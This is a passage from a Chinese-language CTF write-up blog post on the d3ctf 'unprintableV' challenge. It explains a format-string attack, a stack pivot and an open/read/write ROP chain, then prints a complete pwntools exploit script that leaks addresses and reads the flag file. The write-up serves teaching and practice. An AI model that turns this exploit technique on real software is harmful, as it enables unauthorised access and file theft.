+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#我们需要复原menu的rbp  </span></span><br><span class="line">payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>((stack + <span class="number">0x18</span>) &amp; <span class="number">0xFF</span>) + <span class="string">&#x27;c%6$hhnTAG&#x27;</span>  </span><br><span class="line">sh.sendline(payload)  </span><br></pre></td></tr></table></figure>
+
+<p>构造ROP时，有些gadget可能在程序二进制文件里没有，我们可以去libc.so.6中找找。只需利用ROPgadget工具即可</p>
+<p>ROPgadget –binary libc.so.6 –only ‘pop|ret’ | grep ‘rdx’</p>
+<p>然后，我们就开始构造ROP链了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#现在当退出main时，栈就会转移到buf里去  </span></span><br><span class="line">rop = <span class="string">&#x27;d^3CTF&#x27;</span>.ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)  </span><br><span class="line"><span class="comment">#rsi = 0  </span></span><br><span class="line">rop += p64(pop_rsi_addr) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)  </span><br><span class="line"><span class="comment">#rdi = &#x27;flag&#x27;，我们把flag字符串存到buf+0xC8处  </span></span><br><span class="line">rop += p64(pop_rdi_addr) + p64(buf_addr + <span class="number">0xC8</span>)  </span><br><span class="line"><span class="comment">#open  </span></span><br><span class="line">rop += p64(open_addr)  </span><br><span class="line"><span class="comment">#rdx = 0x30  </span></span><br><span class="line">rop += p64(pop_rdx_addr) + p64(<span class="number">0x30</span>)  </span><br><span class="line"><span class="comment">#rdi = buf + 0x100,我们把读取的结果存在buf+0x100处  </span></span><br><span class="line">rop += p64(pop_rsi_addr) + p64(buf_addr+<span class="number">0x100</span>) + p64(<span class="number">0</span>)  </span><br><span class="line"><span class="comment">#fd = 1,文件描述符1是现在对应打开的flag文件  </span></span><br><span class="line">rop += p64(pop_rdi_addr) + p64(<span class="number">1</span>)  </span><br><span class="line"><span class="comment">#read  </span></span><br><span class="line">rop += p64(read_addr)  </span><br><span class="line"><span class="comment">#rdx = 0x30  </span></span><br><span class="line">rop += p64(pop_rdx_addr) + p64(<span class="number">0x30</span>)  </span><br><span class="line"><span class="comment">#rdi = buf + 0x100  </span></span><br><span class="line">rop += p64(pop_rsi_addr) + p64(buf_addr+<span class="number">0x100</span>) + p64(<span class="number">0</span>)  </span><br><span class="line"><span class="comment">#fd = 2,文件描述符2是stderr  </span></span><br><span class="line">rop += p64(pop_rdi_addr) + p64(<span class="number">2</span>)  </span><br><span class="line"><span class="comment">#write  </span></span><br><span class="line">rop += p64(write_addr)  </span><br><span class="line">rop = rop.ljust(<span class="number">0xC8</span>,<span class="string">&#x27;\x00&#x27;</span>)  </span><br><span class="line"><span class="comment">#存入flag字符串  </span></span><br><span class="line">rop += <span class="string">&#x27;flag\x00&#x27;</span>  </span><br><span class="line">rop = rop.ljust(<span class="number">0x12C</span>-<span class="number">1</span>,<span class="string">&#x27;\x00&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">sh.sendline(rop)  </span><br></pre></td></tr></table></figure>
+
+<p>我们在**[开头写入了d^3CTFx00]{.mark}**，使得经过printf后，程序检测到d^3CTF，就直接退出main，就能执行我们的ROP链了，这样一次性搞定</p>
+<p>需要注意的是文件描述符1对应了我们打开的flag文件，因为之前close(1)，所以当我们open时，1就会被利用起来。也可以具体调试一下，得到文件描述符。</p>
+<img src="/ha1vk/2019/11/30/d3ctf_unprintableV/image15.JPG" class="">
+
+<p>综上，我们的exp脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8  </span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line"><span class="keyword">import</span> time  </span><br><span class="line">  </span><br><span class="line">elf = ELF(<span class="string">&#x27;./unprintableV&#x27;</span>)  </span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)  </span><br><span class="line">stdout_bss = elf.symbols[<span class="string">&#x27;stdout&#x27;</span>]  </span><br><span class="line">_IO_2_1_stderr_ = libc.symbols[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>]  </span><br><span class="line">__libc_start_main = libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]  </span><br><span class="line">main_s = elf.symbols[<span class="string">&#x27;main&#x27;</span>]  </span><br><span class="line">buf_s = elf.symbols[<span class="string">&#x27;buf&#x27;</span>]  </span><br><span class="line">open_s = libc.sym[<span class="string">&#x27;open&#x27;</span>]  </span><br><span class="line">read_s = libc.sym[<span class="string">&#x27;read&#x27;</span>]  </span><br><span class="line">write_s = libc.sym[<span class="string">&#x27;write&#x27;</span>]  </span><br><span class="line"><span class="comment">#pop rsi  </span></span><br><span class="line"><span class="comment">#pop r15  </span></span><br><span class="line"><span class="comment">#retn  </span></span><br><span class="line">pop_rsi = <span class="number">0xBC1</span>  </span><br><span class="line"><span class="comment">#pop rdi  </span></span><br><span class="line"><span class="comment">#retn  </span></span><br><span class="line">pop_rdi = <span class="number">0xBC3</span>  </span><br><span class="line"><span class="comment">#leave  </span></span><br><span class="line"><span class="comment">#retn  </span></span><br><span class="line">leave = <span class="number">0xB56</span>  </span><br><span class="line"><span class="comment">#libc.so.6中  </span></span><br><span class="line"><span class="comment">#pop rdx ;ret  </span></span><br><span class="line">pop_rdx = <span class="number">0x1b96</span>  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_i</span>(<span class="params">sh,stack,index,addr</span>):  </span><br><span class="line">   i = <span class="number">0</span>  </span><br><span class="line">   <span class="keyword">while</span> addr &gt; <span class="number">0</span>:  </span><br><span class="line">      <span class="comment">#sh.recvuntil(&#x27;TAG&#x27;)  </span></span><br><span class="line">      <span class="comment">#设定栈顶向下第10个数据为stack+0x8*index  </span></span><br><span class="line">      payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>((stack + <span class="number">0x8</span>*index + i) &amp; <span class="number">0xFF</span>) + <span class="string">&#x27;c%6$hhnTAG&#x27;</span>  </span><br><span class="line">      sh.sendline(payload)  </span><br><span class="line">      sh.recvuntil(<span class="string">&#x27;TAG&#x27;</span>)  </span><br><span class="line">      data = addr &amp; <span class="number">0xFF</span>  </span><br><span class="line">      payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(data) + <span class="string">&#x27;c%10$hhnTAG&#x27;</span>  </span><br><span class="line">      sh.sendline(payload.ljust(<span class="number">0x12C</span>-<span class="number">1</span>,<span class="string">&#x27;\x00&#x27;</span>))  </span><br><span class="line">      sh.recvuntil(<span class="string">&#x27;TAG&#x27;</span>)  </span><br><span class="line">      addr = addr &gt;&gt; <span class="number">8</span>  </span><br><span class="line">      i+=<span class="number">1</span>  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crack</span>(<span class="params">sh</span>):  </span><br><span class="line">   sh.recvuntil(<span class="string">&#x27;0x&#x27;</span>)  </span><br><span class="line">   <span class="comment">#获得a指针的地址  </span></span><br><span class="line">   stack = <span class="built_in">int</span>(sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)  </span><br><span class="line">   <span class="built_in">print</span> <span class="built_in">hex</span>(stack)  </span><br><span class="line">  </span><br><span class="line">   payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(stack &amp; <span class="number">0xFF</span>) + <span class="string">&#x27;c%6$hhn&#x27;</span>  </span><br><span class="line">   sh.recvuntil(<span class="string">&#x27;may you enjoy my printf test!\n&#x27;</span>)  </span><br><span class="line">   sh.sendline(payload.ljust(<span class="number">0x12C</span>-<span class="number">1</span>,<span class="string">&#x27;\x00&#x27;</span>))  </span><br><span class="line">   <span class="comment">#注意，休眠是必要的  </span></span><br><span class="line">   time.sleep(<span class="number">0.5</span>)  </span><br><span class="line">   payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(stdout_bss &amp; <span class="number">0xFF</span>) + <span class="string">&#x27;c%10$hhn&#x27;</span>  </span><br><span class="line">   sh.sendline(payload.ljust(<span class="number">0x12C</span>-<span class="number">1</span>,<span class="string">&#x27;\x00&#x27;</span>))  </span><br><span class="line">   <span class="comment">#注意，休眠是必要的  </span></span><br><span class="line">   time.sleep(<span class="number">0.5</span>)  </span><br><span class="line">   payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(_IO_2_1_stderr_ &amp; <span class="number">0xFFF</span>) + <span class="string">&#x27;c%9$hn&#x27;</span>  </span><br><span class="line">   sh.sendline(payload.ljust(<span class="number">0x12C</span>-<span class="number">1</span>,<span class="string">&#x27;\x00&#x27;</span>))  </span><br><span class="line">   <span class="comment">#休眠是必要的  </span></span><br><span class="line">   time.sleep(<span class="number">0.2</span>)  </span><br><span class="line">   sh.sendline(<span class="string">&#x27;aaaaaaa&#x27;</span>.ljust(<span class="number">0x12C</span>-<span class="number">1</span>,<span class="string">&#x27;\x00&#x27;</span>))  </span><br><span class="line">  </span><br><span class="line">   x = sh.recvuntil(<span class="string">&#x27;aa&#x27;</span>,timeout=<span class="number">0.5</span>)  </span><br><span class="line">   <span class="keyword">if</span> <span class="string">&#x27;aa&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> x:  </span><br><span class="line">      <span class="keyword">raise</span> Exception(<span class="string">&#x27;retry&#x27;</span>)  </span><br><span class="line">   <span class="comment">#泄露main+0x2D的地址  </span></span><br><span class="line">   payload = <span class="string">&#x27;%11$p%15$pTAG&#x27;</span>  </span><br><span class="line">   sh.sendline(payload.ljust(<span class="number">0x12C</span>-<span class="number">1</span>,<span class="string">&#x27;\x00&#x27;</span>))  </span><br><span class="line">   sh.recvuntil(<span class="string">&#x27;0x&#x27;</span>)  </span><br><span class="line">   main_addr = <span class="built_in">int</span>(sh.recvuntil(<span class="string">&#x27;0x&#x27;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>) - <span class="number">0x2D</span>  </span><br><span class="line">   elf_base = main_addr - main_s  </span><br><span class="line">   pop_rsi_addr = pop_rsi + elf_base  </span><br><span class="line">   pop_rdi_addr = pop_rdi + elf_base  </span><br><span class="line">   buf_addr = buf_s + elf_base  </span><br><span class="line">   leave_addr = leave + elf_base  </span><br><span class="line">   <span class="comment">#泄露__libc_start_main+E7的地址  </span></span><br><span class="line">   __libc_start_main_addr = <span class="built_in">int</span>(sh.recvuntil(<span class="string">&#x27;TAG&#x27;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>) - <span class="number">0xE7</span>  </span><br><span class="line">   libc_base = __libc_start_main_addr - __libc_start_main  </span><br><span class="line">   open_addr = libc_base + open_s  </span><br><span class="line">   read_addr = libc_base + read_s  </span><br><span class="line">   write_addr = libc_base + write_s  </span><br><span class="line">   pop_rdx_addr = libc_base + pop_rdx  </span><br><span class="line">   <span class="built_in">print</span> <span class="string">&#x27;elf_base=&#x27;</span>,<span class="built_in">hex</span>(elf_base)  </span><br><span class="line">   <span class="built_in">print</span> <span class="string">&#x27;libc_base=&#x27;</span>,<span class="built_in">hex</span>(libc_base)  </span><br><span class="line">  </span><br><span class="line">   <span class="comment">#我们修改main的rbp，做栈迁移  </span></span><br><span class="line">   write_i(sh,stack,<span class="number">3</span>,buf_addr)  </span><br><span class="line">   <span class="comment">#这次，我们写main的返回地址，也就是main ebp后面那个空间  </span></span><br><span class="line">   write_i(sh,stack,<span class="number">4</span>,leave_addr)  </span><br><span class="line">  </span><br><span class="line">   <span class="comment">#我们需要复原menu的rbp  </span></span><br><span class="line">   payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>((stack + <span class="number">0x18</span>) &amp; <span class="number">0xFF</span>) + <span class="string">&#x27;c%6$hhnTAG&#x27;</span>  </span><br><span class="line">   sh.sendline(payload)  </span><br><span class="line">  </span><br><span class="line">   <span class="comment">#现在当退出main时，栈就会转移到buf里去  </span></span><br><span class="line">   rop = <span class="string">&#x27;d^3CTF&#x27;</span>.ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)  </span><br><span class="line">   <span class="comment">#rsi = 0  </span></span><br><span class="line">   rop += p64(pop_rsi_addr) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)  </span><br><span class="line">   <span class="comment">#rdi = &#x27;flag&#x27;，我们把flag字符串存到buf+0xC8处  </span></span><br><span class="line">   rop += p64(pop_rdi_addr) + p64(buf_addr + <span class="number">0xC8</span>)  </span><br><span class="line">   <span class="comment">#open  </span></span><br><span class="line">   rop += p64(open_addr)  </span><br><span class="line">   <span class="comment">#rdx = 0x30  </span></span><br><span class="line">   rop += p64(pop_rdx_addr) + p64(<span class="number">0x30</span>)  </span><br><span class="line">   <span class="comment">#rdi = buf + 0x100,我们把读取的结果存在buf+0x100处  </span></span><br><span class="line">   rop += p64(pop_rsi_addr) + p64(buf_addr+<span class="number">0x100</span>) + p64(<span class="number">0</span>)  </span><br><span class="line">   <span class="comment">#fd = 1,文件描述符1是现在对应打开的flag文件  </span></span><br><span class="line">   rop += p64(pop_rdi_addr) + p64(<span class="number">1</span>)  </span><br><span class="line">   <span class="comment">#read  </span></span><br><span class="line">   rop += p64(read_addr)  </span><br><span class="line">   <span class="comment">#rdx = 0x30  </span></span><br><span class="line">   rop += p64(pop_rdx_addr) + p64(<span class="number">0x30</span>)  </span><br><span class="line">   <span class="comment">#rdi = buf + 0x100  </span></span><br><span class="line">   rop += p64(pop_rsi_addr) + p64(buf_addr+<span class="number">0x100</span>) + p64(<span class="number">0</span>)  </span><br><span class="line">   <span class="comment">#fd = 2,文件描述符2是stderr  </span></span><br><span class="line">   rop += p64(pop_rdi_addr) + p64(<span class="number">2</span>)  </span><br><span class="line">   <span class="comment">#write  </span></span><br><span class="line">   rop += p64(write_addr)  </span><br><span class="line">   rop = rop.ljust(<span class="number">0xC8</span>,<span class="string">&#x27;\x00&#x27;</span>)  </span><br><span class="line">   <span class="comment">#存入flag字符串  </span></span><br><span class="line">   rop += <span class="string">&#x27;flag\x00&#x27;</span>  </span><br><span class="line">   rop = rop.ljust(<span class="number">0x12C</span>-<span class="number">1</span>,<span class="string">&#x27;\x00&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">   sh.sendline(rop)  </span><br><span class="line">  </span><br><span class="line">   sh.interactive()  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:  </span><br><span class="line">   <span class="keyword">try</span>:  </span><br><span class="line">      sh = process(<span class="string">&#x27;./unprintableV&#x27;</span>,env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:<span class="string">&quot;./libc.so.6&quot;</span>&#125;)  </span><br><span class="line">      crack(sh)  </span><br><span class="line">   <span class="keyword">except</span> BaseException <span class="keyword">as</span> e:  </span><br><span class="line">      <span class="built_in">print</span> e  </span><br><span class="line">      sh.kill()  </span><br><span class="line">      <span class="built_in">print</span> <span class="string">&#x27;retrying...&#x27;</span></span><br></pre></td></tr></table></figure>
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/ha1vk/tags/ROP/" rel="tag"># ROP</a>
+              <a href="/ha1vk/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/" rel="tag"># 格式化字符串漏洞</a>
+              <a href="/ha1vk/tags/%E6%A0%88%E8%BF%81%E7%A7%BB/" rel="tag"># 栈迁移</a>
+              <a href="/ha1vk/tags/IO-FILE/" rel="tag"># IO FILE</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/ha1vk/2019/11/28/d3ctf_new_heap/" rel="prev" title="d3ctf new_heap">
+      <i class="fa fa-chevron-left"></i> d3ctf new_heap
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/ha1vk/2019/12/08/swpuctf2019_p1KkHeap/" rel="next" title="swpuctf2019_p1KkHeap">
+      swpuctf2019_p1KkHeap <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">ha1vk</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/ha1vk/archives/">
+        
+          <span class="site-state-item-count">233</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/ha1vk/categories/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/ha1vk/tags/">
+          
+        <span class="site-state-item-count">145</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ha1vk</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/ha1vk/lib/anime.min.js"></script>
+  <script src="/ha1vk/lib/velocity/velocity.min.js"></script>
+  <script src="/ha1vk/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/ha1vk/js/utils.js"></script>
+
+<script src="/ha1vk/js/motion.js"></script>
+
+
+<script src="/ha1vk/js/schemes/muse.js"></script>
+
+
+<script src="/ha1vk/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/ha1vk/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
